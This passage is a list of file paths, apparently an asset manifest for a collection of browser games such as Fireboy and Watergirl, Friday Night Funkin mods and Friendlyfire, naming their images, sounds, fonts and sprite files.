mages/toaster_spritesheet.png","/src/donut-boy/assets-db/images/tom.png","/src/donut-boy/assets-db/images/unburyGraveGround.png","/src/donut-boy/assets-db/images/water_drop.png","/src/donut-boy/assets-db/images/zach.png","/src/donut-boy/assets-db/images/zElevator2.png","/src/donut-boy/assets-db/images/zTrapGate2.png","/src/fire-truck-dash/y8-studio/TemplateData/fullbar.png","/src/fire-truck-dash/y8-studio/TemplateData/gears.gif","/src/fire-truck-dash/y8-studio/TemplateData/loadingbar.png","/src/fire-truck-dash/y8-studio/TemplateData/logo.png","/src/fire-truck-dash/y8-studio/TemplateData/maximize-icon.png","/src/fire-truck-dash/y8-studio/TemplateData/style.css","/src/fire-truck-dash/y8-studio/TemplateData/unity-disable.png","/src/fire-truck-dash/y8-studio/TemplateData/unity-enable.png","/src/fire-truck-dash/y8-studio/TemplateData/UnityProgress.js","/src/fire-truck-dash/y8-studio/TemplateData/webgl-disable.png","/src/fire-truck-dash/y8-studio/TemplateData/webgl-enable.png","/src/fire-truck-dash/y8-studio/TemplateData/y8-logo.png","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/CharAssets.json","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/CharAssets.png","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/GroundAssets.json","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/GroundAssets.png","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/MechAssets.json","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/MechAssets.png","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/MenuAssets.json","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/MenuAssets.png","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/MenuBackgrounds.json","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/MenuBackgrounds.png","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/PopupAssets.json","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/PopupAssets.png","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/PreloaderAssets.json","/src/fireboy-and-watergirl-forest-temple/assets/atlasses/PreloaderAssets.png","/src/fireboy-and-watergirl-forest-temple/assets/audio/CharToggle1.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/CharToggle2.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Clock.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Death.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Diamond.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Door.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/EndDiamond.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/EndFail.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/EndPass.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Freeze.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/IceSteps_fb.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/IceSteps_wg.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Jump_fb.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Jump_wg.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/LevelMusic.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/LevelMusicFinish.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/LevelMusicFinish_speed.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/LevelMusicOver.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/LevelMusic_dark.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/LevelMusic_speed.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Lever.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/LightPusher.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Melt.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/MenuMusic.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Platform.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/PortalClose.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/PortalLoop.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/PortalOpen.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/PortalTransport.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Pusher.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Slider.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/WaterSteps.mp3","/src/fireboy-and-watergirl-forest-temple/assets/audio/Wind.mp3","/src/fireboy-and-watergirl-forest-temple/assets/fonts/fbwg_font_cyrillic.fnt","/src/fireboy-and-watergirl-forest-temple/assets/fonts/fbwg_font_cyrillic.png","/src/fireboy-and-watergirl-forest-temple/assets/fonts/font.fnt","/src/fireboy-and-watergirl-forest-temple/assets/fonts/font.png","/src/fireboy-and-watergirl-forest-temple/assets/images/Beam.png","/src/fireboy-and-watergirl-forest-temple/assets/images/GameNameForest.png","/src/fireboy-and-watergirl-forest-temple/assets/images/TempleHallForest.jpg","/src/fireboy-and-watergirl-forest-temple/assets/images/TOASTER-MINI-new.png","/src/fireboy-and-watergirl-forest-temple/bower_components/requirejs/require.js","/src/fireboy-and-watergirl-forest-temple/data/forest/temple.json","/src/flakboy/sound/m4a/blood.m4a","/src/flakboy/sound/m4a/buttons_hit.m4a","/src/flakboy/sound/m4a/casing.m4a","/src/flakboy/sound/m4a/cleaner_robots.m4a","/src/flakboy/sound/m4a/complete.m4a","/src/flakboy/sound/m4a/duck_appears.m4a","/src/flakboy/sound/m4a/failed.m4a","/src/flakboy/sound/m4a/mainscreen.m4a","/src/flakboy/sound/m4a/menu_close.m4a","/src/flakboy/sound/m4a/menu_open.m4a","/src/flakboy/sound/m4a/mine2.m4a","/src/flakboy/sound/m4a/mine3.m4a","/src/flakboy/sound/m4a/mine4.m4a","/src/flakboy/sound/m4a/missile_explosion2.m4a","/src/flakboy/sound/m4a/music_1.m4a","/src/flakboy/sound/m4a/music_2.m4a","/src/flakboy/sound/m4a/music_3.m4a","/src/flakboy/sound/m4a/spikes_hit.m4a","/src/flakboy/sound/m4a/spikes_out.m4a","/src/flakboy/sound/m4a/spikes_out2.m4a","/src/flakboy/sound/m4a/spikes_out3.m4a","/src/flakboy/sound/m4a/springtool_in.m4a","/src/flakboy/sound/m4a/springtool_out.m4a","/src/flakboy/sound/m4a/turret_firing.m4a","/src/flakboy/sound/m4a/turret_firing2.m4a","/src/flakboy/sound/m4a/turret_firing3.m4a","/src/flakboy/spritesheets/r768/damage.json","/src/flakboy/spritesheets/r768/damage.png","/src/flakboy/spritesheets/r768/dialogs.json","/src/flakboy/spritesheets/r768/dialogs.png","/src/flakboy/spritesheets/r768/flakboy_skeleton_1.json","/src/flakboy/spritesheets/r768/gamebackground.jpg","/src/flakboy/spritesheets/r768/gamebackground.json","/src/flakboy/spritesheets/r768/gamescreen.json","/src/flakboy/spritesheets/r768/gamescreen.png","/src/flakboy/spritesheets/r768/loading.json","/src/flakboy/spritesheets/r768/loading.png","/src/flakboy/spritesheets/r768/menubackground.jpg","/src/flakboy/spritesheets/r768/menubackground.json","/src/flappy-2048/style/fonts/clear-sans.css","/src/flappy-2048/style/fonts/ClearSans-Bold-webfont.eot","/src/flappy-2048/style/fonts/ClearSans-Bold-webfont.svg","/src/flappy-2048/style/fonts/ClearSans-Bold-webfont.woff","/src/flappy-2048/style/fonts/ClearSans-Light-webfont.eot","/src/flappy-2048/style/fonts/ClearSans-Light-webfont.svg","/src/flappy-2048/style/fonts/ClearSans-Light-webfont.woff","/src/flappy-2048/style/fonts/ClearSans-Regular-webfont.eot","/src/flappy-2048/style/fonts/ClearSans-Regular-webfont.svg","/src/flappy-2048/style/fonts/ClearSans-Regular-webfont.woff","/src/friday-night-funkin--vs-ex/assets/data/characterList.txt","/src/friday-night-funkin--vs-ex/assets/data/controls.txt","/src/friday-night-funkin--vs-ex/assets/data/data-goes-here.txt","/src/friday-night-funkin--vs-ex/assets/data/freeplaySonglist.txt","/src/friday-night-funkin--vs-ex/assets/data/introText.txt","/src/friday-night-funkin--vs-ex/assets/data/main-view.xml","/src/friday-night-funkin--vs-ex/assets/data/specialThanks.txt","/src/friday-night-funkin--vs-ex/assets/fonts/fonts-go-here.txt","/src/friday-night-funkin--vs-ex/assets/fonts/pixel.woff","/src/friday-night-funkin--vs-ex/assets/fonts/vcr.woff","/src/friday-night-funkin--vs-ex/assets/images/alphabet.png","/src/friday-night-funkin--vs-ex/assets/images/alphabet.xml","/src/friday-night-funkin--vs-ex/assets/images/campaign_menu_UI_assets.png","/src/friday-night-funkin--vs-ex/assets/images/campaign_menu_UI_assets.xml","/src/friday-night-funkin--vs-ex/assets/images/FNF_main_menu_assets.png","/src/friday-night-funkin--vs-ex/assets/images/FNF_main_menu_assets.xml","/src/friday-night-funkin--vs-ex/assets/images/iconGrid.png","/src/friday-night-funkin--vs-ex/assets/images/logoBumpin.png","/src/friday-night-funkin--vs-ex/assets/images/logoBumpin.xml","/src/friday-night-funkin--vs-ex/assets/images/menuBG.png","/src/friday-night-funkin--vs-ex/assets/images/menuBGBlue.png","/src/friday-night-funkin--vs-ex/assets/images/menuBGMagenta.png","/src/friday-night-funkin--vs-ex/assets/images/menuDesat.png","/src/friday-night-funkin--vs-ex/assets/images/Menu_Heart.png","/src/friday-night-funkin--vs-ex/assets/images/Menu_Heart.xml","/src/friday-night-funkin--vs-ex/assets/images/newgrounds_logo.png","/src/friday-night-funkin--vs-ex/assets/images/num0.png","/src/friday-night-funkin--vs-ex/assets/images/num1.png","/src/friday-night-funkin--vs-ex/assets/images/num2.png","/src/friday-night-funkin--vs-ex/assets/images/num3.png","/src/friday-night-funkin--vs-ex/assets/images/num4.png","/src/friday-night-funkin--vs-ex/assets/images/num5.png","/src/friday-night-funkin--vs-ex/assets/images/num6.png","/src/friday-night-funkin--vs-ex/assets/images/num7.png","/src/friday-night-funkin--vs-ex/assets/images/num8.png","/src/friday-night-funkin--vs-ex/assets/images/num9.png","/src/friday-night-funkin--vs-ex/assets/images/titleEnter.png","/src/friday-night-funkin--vs-ex/assets/images/titleEnter.xml","/src/friday-night-funkin--vs-ex/assets/images/virtual-input.png","/src/friday-night-funkin--vs-ex/assets/images/virtual-input.txt","/src/friday-night-funkin--vs-ex/assets/music/freakyMenu.mp3","/src/friday-night-funkin--vs-ex/assets/sounds/cancelMenu.mp3","/src/friday-night-funkin--vs-ex/assets/sounds/confirmMenu.mp3","/src/friday-night-funkin--vs-ex/assets/sounds/scrollMenu.mp3","/src/friday-night-funkin--vs-ex/assets/week0/week0_stuff_here.txt","/src/friday-night-funkin--vs-ex/flixel/fonts/monsterrat.woff","/src/friday-night-funkin--vs-ex/flixel/fonts/nokiafc22.woff","/src/friday-night-funkin--vs-ex/flixel/sounds/beep.mp3","/src/friday-night-funkin--vs-ex/flixel/sounds/flixel.mp3","/src/friday-night-funkin--week-6/assets/audio/bgm.mp3","/src/friday-night-funkin--week-6/assets/audio/button.mp3","/src/friday-night-funkin--week-6/assets/audio/coin-bonus.mp3","/src/friday-night-funkin--week-6/assets/audio/coin.mp3","/src/friday-night-funkin--week-6/assets/audio/crash.mp3","/src/friday-night-funkin--week-6/assets/audio/crash2.mp3","/src/friday-night-funkin--week-6/assets/audio/end.mp3","/src/friday-night-funkin--week-6/assets/audio/ground-hit.mp3","/src/friday-night-funkin--week-6/assets/audio/jump.mp3","/src/friday-night-funkin--week-6/assets/audio/magnet.mp3","/src/friday-night-funkin--week-6/assets/audio/shield.mp3","/src/friday-night-funkin--week-6/assets/audio/wing.mp3","/src/friday-night-funkin--week-6/assets/data/characterList.txt","/src/friday-night-funkin--week-6/assets/data/controls.txt","/src/friday-night-funkin--week-6/assets/data/data-goes-here.txt","/src/friday-night-funkin--week-6/assets/data/freeplaySonglist.txt","/src/friday-night-funkin--week-6/assets/data/introText.txt","/src/friday-night-funkin--week-6/assets/data/main-view.xml","/src/friday-night-funkin--week-6/assets/data/specialThanks.txt","/src/friday-night-funkin--week-6/assets/fonts/fonts-go-here.txt","/src/friday-night-funkin--week-6/assets/fonts/pixel.woff","/src/friday-night-funkin--week-6/assets/fonts/vcr.woff","/src/friday-night-funkin--week-6/assets/images/alphabet.png","/src/friday-night-funkin--week-6/assets/images/alphabet.xml","/src/friday-night-funkin--week-6/assets/images/campaign_menu_UI_assets.png","/src/friday-night-funkin--week-6/assets/images/campaign_menu_UI_assets.xml","/src/friday-night-funkin--week-6/assets/images/campaign_menu_UI_characters.png","/src/friday-night-funkin--week-6/assets/images/campaign_menu_UI_characters.xml","/src/friday-night-funkin--week-6/assets/images/FNF_main_menu_assets.png","/src/friday-night-funkin--week-6/assets/images/FNF_main_menu_assets.xml","/src/friday-night-funkin--week-6/assets/images/gfDanceTitle.png","/src/friday-night-funkin--week-6/assets/images/gfDanceTitle.xml","/src/friday-night-funkin--week-6/assets/images/iconGrid.png","/src/friday-night-funkin--week-6/assets/images/logo.png","/src/friday-night-funkin--week-6/assets/images/logoBumpin.png","/src/friday-night-funkin--week-6/assets/images/logoBumpin.xml","/src/friday-night-funkin--week-6/assets/images/menuBG.png","/src/friday-night-funkin--week-6/assets/images/menuBGBlue.png","/src/friday-night-funkin--week-6/assets/images/menuBGMagenta.png","/src/friday-night-funkin--week-6/assets/images/menuDesat.png","/src/friday-night-funkin--week-6/assets/images/Menu_Heart.png","/src/friday-night-funkin--week-6/assets/images/Menu_Heart.xml","/src/friday-night-funkin--week-6/assets/images/newgrounds_logo.png","/src/friday-night-funkin--week-6/assets/images/num0.png","/src/friday-night-funkin--week-6/assets/images/num1.png","/src/friday-night-funkin--week-6/assets/images/num2.png","/src/friday-night-funkin--week-6/assets/images/num3.png","/src/friday-night-funkin--week-6/assets/images/num4.png","/src/friday-night-funkin--week-6/assets/images/num5.png","/src/friday-night-funkin--week-6/assets/images/num6.png","/src/friday-night-funkin--week-6/assets/images/num7.png","/src/friday-night-funkin--week-6/assets/images/num8.png","/src/friday-night-funkin--week-6/assets/images/num9.png","/src/friday-night-funkin--week-6/assets/images/titleEnter.png","/src/friday-night-funkin--week-6/assets/images/titleEnter.xml","/src/friday-night-funkin--week-6/assets/images/virtual-input.png","/src/friday-night-funkin--week-6/assets/images/virtual-input.txt","/src/friday-night-funkin--week-6/assets/models/objects.gltf","/src/friday-night-funkin--week-6/assets/models/RobotExpressive.glb","/src/friday-night-funkin--week-6/assets/models/wing.fbx","/src/friday-night-funkin--week-6/assets/music/freakyMenu.mp3","/src/friday-night-funkin--week-6/assets/sounds/cancelMenu.mp3","/src/friday-night-funkin--week-6/assets/sounds/confirmMenu.mp3","/src/friday-night-funkin--week-6/assets/sounds/scrollMenu.mp3","/src/friday-night-funkin--week-6/assets/text/saira-semibold.woff","/src/friday-night-funkin--week-6/assets/week0/week0_stuff_here.txt","/src/friday-night-funkin--week-6/flixel/fonts/monsterrat.woff","/src/friday-night-funkin--week-6/flixel/fonts/nokiafc22.woff","/src/friday-night-funkin--week-6/flixel/sounds/beep.mp3","/src/friday-night-funkin--week-6/flixel/sounds/flixel.mp3","/src/friendlyfire/assets/appicon.iconset/icon_1024x1024.png","/src/friendlyfire/assets/appicon.iconset/icon_128x128.png","/src/friendlyfire/assets/appicon.iconset/icon_128x128@2x.png","/src/friendlyfire/assets/appicon.iconset/icon_144x144.png","/src/friendlyfire/assets/appicon.iconset/icon_168x168.png","/src/friendlyfire/assets/appicon.iconset/icon_16x16.png","/src/friendlyfire/assets/appicon.iconset/icon_16x16@2x.png","/src/friendlyfire/assets/appicon.iconset/icon_192x192.png","/src/friendlyfire/assets/appicon.iconset/icon_256x256.png","/src/friendlyfire/assets/appicon.iconset/icon_256x256@2x.png","/src/friendlyfire/assets/appicon.iconset/icon_32x32.png","/src/friendlyfire/assets/appicon.iconset/icon_32x32@2x.png","/src/friendlyfire/assets/appicon.iconset/icon_48x48.png","/src/friendlyfire/assets/appicon.iconset/icon_512x512.png","/src/friendlyfire/assets/appicon.iconset/icon_512x512@2x.png","/src/friendlyfire/assets/appicon.iconset/icon_64x64.png","/src/friendlyfire/assets/appicon.iconset/icon_72x72.png","/src/friendlyfire/assets/appicon.iconset/icon_96x96.png","/src/friendlyfire/assets/dialog/bird.dialog.json","/src/friendlyfire/assets/dialog/caveman1.dialog.json","/src/friendlyfire/assets/dialog/caveman2.dialog.json","/src/friendlyfire/assets/dialog/chicken.dialog.json","/src/friendlyfire/assets/dialog/fire0.dialog.json","/src/friendlyfire/assets/dialog/fire1.dialog.json","/src/friendlyfire/assets/dialog/fire2.dialog.json","/src/friendlyfire/assets/dialog/fire3.dialog.json","/src/friendlyfire/assets/dialog/fire4.dialog.json","/src/friendlyfire/assets/dialog/flameboy1.dialog.json","/src/friendlyfire/assets/dialog/flameboy2.dialog.json","/src/friendlyfire/assets/dialog/flameboy3.dialog.json","/src/friendlyfire/assets/dialog/flameboy4.dialog.json","/src/friendlyfire/assets/dialog/mimic.dialog.json","/src/friendlyfire/assets/dialog/powershiba1.dialog.json","/src/friendlyfire/assets/dialog/powershiba2.dialog.json","/src/friendlyfire/assets/dialog/powershiba3.dialog.json","/src/friendlyfire/assets/dialog/README.md","/src/friendlyfire/assets/dialog/seed1.dialog.json","/src/friendlyfire/assets/dialog/shadowpresence1.dialog.json","/src/friendlyfire/assets/dialog/shiba1.dialog.json","/src/friendlyfire/assets/dialog/shiba2.dialog.json","/src/friendlyfire/assets/dialog/shiba3.dialog.json","/src/friendlyfire/assets/dialog/shiba4.dialog.json","/src/friendlyfire/assets/dialog/shiba5.dialog.json","/src/friendlyfire/assets/dialog/spider1.dialog.json","/src/friendlyfire/assets/dialog/stone1.dialog.json","/src/friendlyfire/assets/dialog/stone2.dialog.json","/src/friendlyfire/assets/dialog/stonedisciple1.dialog.json","/src/friendlyfire/assets/dialog/stonedisciple2.dialog.json","/src/friendlyfire/assets/dialog/superthrow.dialog.json","/src/friendlyfire/assets/dialog/tree0.dialog.json","/src/friendlyfire/assets/dialog/tree1.dialog.json","/src/friendlyfire/assets/dialog/tree2.dialog.json","/src/friendlyfire/assets/dialog/window.dialog.json","/src/friendlyfire/assets/dialog/wing1.dialog.json","/src/friendlyfire/assets/fonts/credits.font.json","/src/friendlyfire/assets/fonts/credits.png","/src/friendlyfire/assets/fonts/headline.font.json","/src/friendlyfire/assets/fonts/headline.png","/src/friendlyfire/assets/fonts/pixcelsior.font.json","/src/friendlyfire/assets/fonts/pixcelsior.png","/src/friendlyfire/assets/gradients/fire.png","/src/friendlyfire/assets/images/characterSelection.png","/src/friendlyfire/assets/images/controls.png","/src/friendlyfire/assets/images/controls_gamepad.aseprite","/src/friendlyfire/assets/images/controls_gamepad.aseprite.json","/src/friendlyfire/assets/images/controls_gamepad.png","/src/friendlyfire/assets/images/controls_icon_keyboard.png","/src/friendlyfire/assets/images/controls_keyboard.png","/src/friendlyfire/assets/images/credits.png","/src/friendlyfire/assets/images/credits_bg.png","/src/friendlyfire/assets/images/end.png","/src/friendlyfire/assets/images/gamepad_selection.aseprite","/src/friendlyfire/assets/images/gamepad_selection.aseprite.json","/src/friendlyfire/assets/images/gamepad_selection.json","/src/friendlyfire/assets/images/gamepad_selection.png","/src/friendlyfire/assets/images/logo.png","/src/friendlyfire/assets/images/panel.png","/src/friendlyfire/assets/images/title.png","/src/friendlyfire/assets/maps/bg.png","/src/friendlyfire/assets/maps/bg2.aseprite","/src/friendlyfire/assets/maps/bg2.png","/src/friendlyfire/assets/maps/bg3.aseprite","/src/friendlyfire/assets/maps/bg3.png","/src/friendlyfire/assets/maps/level.json","/src/friendlyfire/assets/maps/level.png","/src/friendlyfire/assets/maps/level_collision.png","/src/friendlyfire/assets/maps/tilemap.aseprite","/src/friendlyfire/assets/maps/tilemap.png","/src/friendlyfire/assets/maps/tilemap_old.aseprite","/src/friendlyfire/assets/music/a-vision-of-fire-acoustic.ogg","/src/friendlyfire/assets/music/a-vision-of-fire-orchestral.ogg","/src/friendlyfire/assets/music/a-vision-of-fire.ogg","/src/friendlyfire/assets/music/awake.ogg","/src/friendlyfire/assets/music/cave.ogg","/src/friendlyfire/assets/music/cerulean-expanse.ogg","/src/friendlyfire/assets/music/dancing_queen.mmpz","/src/friendlyfire/assets/music/dancing_queen.ogg","/src/friendlyfire/assets/music/ecstasy.ogg","/src/friendlyfire/assets/music/inferno.mmpz","/src/friendlyfire/assets/music/inferno.ogg","/src/friendlyfire/assets/music/pause.ogg","/src/friendlyfire/assets/music/radio.ogg","/src/friendlyfire/assets/music/raindance.mmpz","/src/friendlyfire/assets/music/raindance.ogg","/src/friendlyfire/assets/music/riddle.ogg","/src/friendlyfire/assets/music/theme_01.mmpz","/src/friendlyfire/assets/music/theme_01.ogg","/src/friendlyfire/assets/music/wings.ogg","/src/friendlyfire/assets/palette/colorpalette.aseprite","/src/google-solitaire/img/cutscene/StandardsToUphold.png","/src/google-solitaire/img/cutscene/StopSolvingProblems.png","/src/google-solitaire/img/cutscene/StudentTeacher.png","/src/google-solitaire/img/cutscene/Superpowers.png","/src/google-solitaire/img/cutscene/Teapot.png","/src/google-solitaire/img/cutscene/TellAFriend.png","/src/google-solitaire/img/cutscene/ThanksForPlaytesting.png","/src/google-solitaire/img/cutscene/TheGap.png","/src/google-solitaire/img/cutscene/TheNextBigThing.png","/src/google-solitaire/img/cutscene/Truancy.png","/src/google-solitaire/img/cutscene/TwoMonthWait.png","/src/google-solitaire/img/cutscene/Wait.png","/src/google-solitaire/img/cutscene/WormholeInSight.png","/src/google-solitaire/img/cutscene/YouThink.png","/src/friendlyfire/assets/sprites/bird.aseprite","/src/friendlyfire/assets/sprites/bird.aseprite.json","/src/friendlyfire/assets/sprites/bird.png","/src/friendlyfire/assets/sprites/bone.aseprite","/src/friendlyfire/assets/sprites/bone.aseprite.json","/src/friendlyfire/assets/sprites/bone.png","/src/friendlyfire/assets/sprites/buttons.aseprite","/src/friendlyfire/assets/sprites/buttons.aseprite.json","/src/friendlyfire/assets/sprites/buttons.png","/src/friendlyfire/assets/sprites/buttons_keyboard.aseprite","/src/friendlyfire/assets/sprites/buttons_keyboard.aseprite.json","/src/friendlyfire/assets/sprites/buttons_keyboard.png","/src/friendlyfire/assets/sprites/buttons_playstation.aseprite","/src/friendlyfire/assets/sprites/buttons_playstation.aseprite.json","/src/friendlyfire/assets/sprites/buttons_playstation.png","/src/friendlyfire/assets/sprites/buttons_xbox.aseprite","/src/friendlyfire/assets/sprites/buttons_xbox.aseprite.json","/src/friendlyfire/assets/sprites/buttons_xbox.png","/src/friendlyfire/assets/sprites/campfire.aseprite","/src/friendlyfire/assets/sprites/campfire.aseprite.json","/src/friendlyfire/assets/sprites/campfire.png","/src/friendlyfire/assets/sprites/caveman.aseprite","/src/friendlyfire/assets/sprites/caveman.aseprite.json","/src/friendlyfire/assets/sprites/caveman.asepritejson","/src/friendlyfire/assets/sprites/caveman.png","/src/friendlyfire/assets/sprites/chicken.aseprite","/src/friendlyfire/assets/sprites/chicken.aseprite.json","/src/friendlyfire/assets/sprites/chicken.png","/src/friendlyfire/assets/sprites/cloud3.aseprite","/src/friendlyfire/assets/sprites/cloud3.aseprite.json","/src/friendlyfire/assets/sprites/cloud3.png","/src/friendlyfire/assets/sprites/dancing_ui_bar.png","/src/friendlyfire/assets/sprites/dancing_ui_indicator.png","/src/friendlyfire/assets/sprites/dancing_ui_keys.aseprite","/src/friendlyfire/assets/sprites/dancing_ui_keys.aseprite.json","/src/friendlyfire/assets/sprites/dancing_ui_keys.json","/src/friendlyfire/assets/sprites/dancing_ui_keys.png","/src/friendlyfire/assets/sprites/dialogue.aseprite","/src/friendlyfire/assets/sprites/dialogue.aseprite.json","/src/friendlyfire/assets/sprites/dialogue.png","/src/friendlyfire/assets/sprites/ending_cards.aseprite","/src/friendlyfire/assets/sprites/ending_cards.aseprite.json","/src/friendlyfire/assets/sprites/ending_cards.png","/src/friendlyfire/assets/sprites/flameboy.aseprite","/src/friendlyfire/assets/sprites/flameboy.aseprite.json","/src/friendlyfire/assets/sprites/flameboy.json","/src/friendlyfire/assets/sprites/flameboy.png","/src/friendlyfire/assets/sprites/flameboy2.aseprite","/src/friendlyfire/assets/sprites/flameboy2.aseprite.json","/src/friendlyfire/assets/sprites/flameboy2.png","/src/friendlyfire/assets/sprites/flameicon.aseprite","/src/friendlyfire/assets/sprites/flameicon.aseprite.json","/src/friendlyfire/assets/sprites/flameicon.png","/src/friendlyfire/assets/sprites/heart.aseprite","/src/friendlyfire/assets/sprites/heart.png","/src/friendlyfire/assets/sprites/magicspider.aseprite","/src/friendlyfire/assets/sprites/magicspider.aseprite.json","/src/friendlyfire/assets/sprites/magicspider.png","/src/friendlyfire/assets/sprites/menu_selector.png","/src/friendlyfire/assets/sprites/mimic.aseprite","/src/friendlyfire/assets/sprites/mimic.aseprite.json","/src/friendlyfire/assets/sprites/mimic.png","/src/friendlyfire/assets/sprites/portal.aseprite","/src/friendlyfire/assets/sprites/portal.aseprite.json","/src/friendlyfire/assets/sprites/portal.png","/src/friendlyfire/assets/sprites/powershiba.aseprite","/src/friendlyfire/assets/sprites/powershiba.aseprite.json","/src/friendlyfire/assets/sprites/powershiba.png","/src/friendlyfire/assets/sprites/powerup_box.aseprite","/src/friendlyfire/assets/sprites/powerup_box.png","/src/friendlyfire/assets/sprites/powerup_doublejump.aseprite","/src/friendlyfire/assets/sprites/powerup_doublejump.png","/src/friendlyfire/assets/sprites/powerup_friendship.aseprite","/src/friendlyfire/assets/sprites/powerup_friendship.aseprite.json","/src/friendlyfire/assets/sprites/powerup_friendship.png","/src/friendlyfire/assets/sprites/powerup_multijump.aseprite","/src/friendlyfire/assets/sprites/powerup_multijump.png","/src/friendlyfire/assets/sprites/powerup_raindance.aseprite","/src/friendlyfire/assets/sprites/powerup_raindance.aseprite.json","/src/friendlyfire/assets/sprites/powerup_raindance.png","/src/friendlyfire/assets/sprites/powerup_running.aseprite","/src/friendlyfire/assets/sprites/powerup_running.png","/src/friendlyfire/assets/sprites/radio.aseprite","/src/friendlyfire/assets/sprites/radio.aseprite.json","/src/friendlyfire/assets/sprites/radio.png","/src/friendlyfire/assets/sprites/raindrop.png","/src/friendlyfire/assets/sprites/riddlestone.aseprite","/src/friendlyfire/assets/sprites/riddlestone.aseprite.json","/src/friendlyfire/assets/sprites/riddlestone.png","/src/friendlyfire/assets/sprites/seed.aseprite","/src/friendlyfire/assets/sprites/seed.aseprite.json","/src/friendlyfire/assets/sprites/seed.png","/src/friendlyfire/assets/sprites/shadowpresence.aseprite","/src/friendlyfire/assets/sprites/shadowpresence.aseprite.json","/src/friendlyfire/assets/sprites/shadowpresence.png","/src/friendlyfire/assets/sprites/shiba.aseprite","/src/friendlyfire/assets/sprites/shiba.aseprite.json","/src/friendlyfire/assets/sprites/shiba.png","/src/friendlyfire/assets/sprites/sign.aseprite","/src/friendlyfire/assets/sprites/sign.aseprite.json","/src/friendlyfire/assets/sprites/sign.asepritejson","/src/friendlyfire/assets/sprites/sign.png","/src/friendlyfire/assets/sprites/skull.aseprite","/src/friendlyfire/assets/sprites/skull.aseprite.json","/src/friendlyfire/assets/sprites/skull.png","/src/friendlyfire/assets/sprites/smoke.png","/src/friendlyfire/assets/sprites/steam.png","/src/friendlyfire/assets/sprites/stone.aseprite","/src/friendlyfire/assets/sprites/stone.aseprite.json","/src/friendlyfire/assets/sprites/stone.png","/src/friendlyfire/assets/sprites/stonedisciple.aseprite","/src/friendlyfire/assets/sprites/stonedisciple.aseprite.json","/src/friendlyfire/assets/sprites/stonedisciple.png","/src/friendlyfire/assets/sprites/stoneplatform.aseprite","/src/friendlyfire/assets/sprites/stoneplatform.aseprite.json","/src/friendlyfire/assets/sprites/stoneplatform.png","/src/friendlyfire/assets/sprites/superthrow.aseprite","/src/friendlyfire/assets/sprites/superthrow.aseprite.json","/src/friendlyfire/assets/sprites/superthrow.png","/src/friendlyfire/assets/sprites/table.aseprite","/src/friendlyfire/assets/sprites/table.aseprite.json","/src/friendlyfire/assets/sprites/table.png","/src/friendlyfire/assets/sprites/tree.aseprite","/src/friendlyfire/assets/sprites/tree.aseprite.json","/src/friendlyfire/assets/sprites/tree.png","/src/friendlyfire/assets/sprites/wall.aseprite","/src/friendlyfire/assets/sprites/wall.aseprite.json","/src/friendlyfire/assets/sprites/wall.png","/src/friendlyfire/assets/sprites/wing.aseprite","/src/friendlyfire/assets/sprites/wing.aseprite.json","/src/friendlyfire/assets/sprites/wing.png","/src/friendlyfire/assets/sprites/wood.aseprite","/src/friendlyfire/assets/sprites/wood.aseprite.json","/src/friendlyfire/assets/sprites/wood.png","/src/google-solitaire/img/instructions/SwipeReminder.png","/src/google-solitaire/img/instructions/SwipeVisualInstructions.png","/src/google-solitaire/img/editor/DeleteLevelIcon.png","/src/google-solitaire/img/editor/Drag.png","/src/google-solitaire/img/editor/Ellipsis.png","/src/google-solitaire/img/editor/EraseIcon.png","/src/google-solitaire/img/editor/ScrollArrow.png","/src/google-solitaire/img/editor/SelectedColor.png","/src/google-solitaire/img/editor/ZoomInButton.png","/src/google-solitaire/img/editor/ZoomOutButton.png","/src/google-solitaire/img/map/Battery.png","/src/google-solitaire/img/map/Box.png","/src/google-solitaire/img/map/Bridge.png","/src/google-solitaire/img/map/DerpRunner.png","/src/google-solitaire/img/map/Infinity.png","/src/google-solitaire/img/map/MapIcon.png","/src/google-solitaire/img/map/MapIconFlat.png","/src/google-solitaire/img/map/MapMask.png","/src/google-solitaire/img/map/MovableBoxesIcon.png","/src/google-solitaire/img/map/MovableBoxIcon.png","/src/google-solitaire/img/map/Planet.png","/src/google-solitaire/img/map/PlanetoidBelt0.png","/src/google-solitaire/img/map/P